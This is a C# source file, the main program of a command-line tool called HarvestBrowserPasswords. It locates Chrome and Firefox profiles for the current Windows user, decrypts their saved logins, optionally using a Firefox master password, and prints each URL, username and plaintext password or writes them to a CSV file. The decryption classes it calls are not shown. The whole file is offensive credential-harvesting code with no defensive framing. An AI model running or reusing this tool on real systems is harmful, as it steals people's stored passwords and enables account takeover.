using CommandLine;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Principal;

namespace HarvestBrowserPasswords
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("HarvestBrowserPasswords.exe v1.0");
            Console.ResetColor();

            //Get username of current user account
            string userAccountName = GetCurrentUser();

            Options opts = new Options();

            var parser = new Parser(with => with.HelpWriter = null);

            //Parse command line arguments
            var result = parser.ParseArguments<Options>(args)
                .WithParsed(parsed => opts = parsed);

            parser.Dispose();

            List<BrowserLoginData> loginDataList = new List<BrowserLoginData>();

            //Check command line arguments
            if (opts.All)
            {
                loginDataList = (loginDataList.Concat(GetChromePasswords(userAccountName))).ToList();
                loginDataList = (loginDataList.Concat(GetFirefoxPasswords(userAccountName, opts.Password))).ToList();
            }
            else if (opts.Chrome)
            {
                loginDataList = (loginDataList.Concat(GetChromePasswords(userAccountName))).ToList();
            }
            else if (opts.Firefox)
            {
                loginDataList = (loginDataList.Concat(GetFirefoxPasswords(userAccountName, opts.Password))).ToList();
            }
            else if (opts.Help)
            {
                PrintHelpToConsole();
            }
            //Check for case where no arguments were entered
            else if (opts.CheckIfNoArgs())
            {
                PrintHelpToConsole();
            }

            //Output all decrypted logins
            if(loginDataList.Count > 0)
            {
                if (string.IsNullOrEmpty(opts.Outfile))
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    PrintLoginsToConsole(loginDataList);
                }
                else
                {
                    WriteToCSV(loginDataList, opts.Outfile);
                }
            }
         
        }

        //Check if currently running in administrator context
        public static bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
      
        public static List<BrowserLoginData> GetChromePasswords(string userAccountName)
        {
            List<string> chromeProfiles = FindChromeProfiles();

            List<BrowserLoginData> loginDataList = new List<BrowserLoginData>();

            foreach (string chromeProfile in chromeProfiles)
            {
                string loginDataFile = chromeProfile + @"\Login Data";
                if (File.Exists(loginDataFile))
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"[+] Found Chrome credential database for user: \"{userAccountName}\" at: \"{loginDataFile}\"");
                    Console.ResetColor();

                    ChromeDatabaseDecryptor decryptor = new ChromeDatabaseDecryptor(loginDataFile);

                    loginDataList = (loginDataList.Concat(decryptor.ChromeLoginDataList)).ToList();
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[-] No credential database found in chrome profile {chromeProfile}");
                    Console.ResetColor();
                }
            }

            return loginDataList;
        }

        public static List<string> FindChromeProfiles()
        {
            string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string chromeDirectory = localAppData + @"\Google\Chrome\User Data";
         
            List<string> profileDirectories = new List<string>();

            if (Directory.Exists(chromeDirectory))
            {
                //Add default profile location once existence of chrome directory is confirmed
                profileDirectories.Add(chromeDirectory + "\\Default");
                foreach (string directory in Directory.GetDirectories(chromeDirectory))
                {
                    if (directory.Contains("Profile "))
                    {
                        profileDirectories.Add(directory);

                    }
                }
            }

            return profileDirectories;
        }

        //Overload for case where master password is set
        public static List<BrowserLoginData> GetFirefoxPasswords(string userAccountName, string masterPassword)
        {
            List<BrowserLoginData> loginDataList = new List<BrowserLoginData>();

            foreach (string profile in FindFirefoxProfiles(userAccountName))
            {
                FirefoxDatabaseDecryptor decryptor = new FirefoxDatabaseDecryptor(profile, masterPassword);

                try
                {
                    //Take the list of logins from this decryptor and add them to the total list of logins
                    loginDataList = (loginDataList.Concat(decryptor.FirefoxLoginDataList)).ToList();
                }
                catch (ArgumentNullException)
                {
                    //ArgumentNullException will be thrown when no key4.db file exists in a profile directory
                }
                
            }

            return loginDataList;
        }

        public static List<string> FindFirefoxProfiles(string userAccountName)
        {
            //List to store profile directories
            List<string> profileDirectories = new List<string>();

            //Roaming directory contains most firefox artifacts apart from cache
            string roamingDir = $"C:\\Users\\{userAccountName}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles";

            //Check roaming profile
            if (Directory.Exists(roamingDir))
            {

                string[] roamingProfiles = Directory.GetDirectories(roamingDir);
                foreach (string directory in roamingProfiles)
                {
                    profileDirectories.Add(directory);
                }
            }

            return profileDirectories;
        }

        public static string GetCurrentUser()
        {
            //Get username for currently running account (SamCompatible Enum format)
            string userAccountSamCompatible = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            
            //Remove domain and backslashes from name
            int index = userAccountSamCompatible.IndexOf("\\", 0, userAccountSamCompatible.Length) + 1;
            string userAccountName = userAccountSamCompatible.Substring(index);

            return userAccountName;
        }

        private static void PrintLoginsToConsole(List<BrowserLoginData> loginDataList)
        {

            string line = new string('=', 60);

            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine(line);

            foreach (BrowserLoginData loginData in loginDataList)
            {
                Console.WriteLine($"URL              {loginData.FormSubmitUrl}");
                Console.WriteLine($"Username         {loginData.Username}");
                Console.WriteLine($"Password         {loginData.Password}");
                Console.WriteLine($"Browser          {loginData.Browser}");
                Console.WriteLine(line);
            }

            Console.ResetColor();
        }

        private static void PrintHelpToConsole()
        {
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("OPTIONS:");
            Console.WriteLine("  -c, --chrome       Locate and decrypt Google Chrome logins\n");
            Console.WriteLine("  -f, --firefox      Locate and decrypt Mozilla Firefox logins\n");
            Console.WriteLine("  -a, --all          Locate and decrypt Google Chrome and Mozilla Firefox logins\n");
            Console.WriteLine("  -p, --password     (Optional) Master password for Mozilla Firefox Logins\n");
            Console.WriteLine("  -o, --outfile      Write output to csv\n");
            Console.WriteLine("  --help             Display help message");

            Console.ResetColor();
        }

        private static void WriteToCSV(List<BrowserLoginData> loginDataList, string outfile)
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine($"[*] Writing decrypted logins to {outfile}");
            Console.ResetColor();

            try
            {
                using (StreamWriter file = new StreamWriter(outfile))
                {
                    file.WriteLine("URL,Username,Password,Browser");

                    foreach (BrowserLoginData loginData in loginDataList)
                    {
                        file.WriteLine($"{loginData.FormSubmitUrl}," +
                            $"{loginData.Username}," +
                            $"{loginData.Password}," +
                            $"{loginData.Browser}");
                    }
                }
            }
            catch (Exception e)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine(e);
                Console.ResetColor();
            }
        }
    }  
}
